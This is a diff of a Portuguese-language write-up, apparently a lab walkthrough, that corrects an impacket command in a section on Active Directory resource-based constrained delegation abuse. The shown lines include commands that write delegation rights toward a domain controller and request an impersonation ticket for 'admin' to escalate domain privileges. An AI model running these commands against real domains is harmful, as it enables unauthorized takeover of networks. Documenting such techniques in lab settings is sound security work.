@@ -136,8 +136,9 @@ impacket-rbcd -delegate-from 'redteam$' -delegate-to 'DC$' -action 'write' 'supp
 Depois fiz alguns testes para verificar se conseguia subir o privilégio no domínio:
 
 ```
-impacket-get -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$:Summer2018!'
+impacket-getST -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$:Summer2018!'
 ```
+
 mas o nome do usuário deve corresponder a algum já existente no domínio:
 
 ```
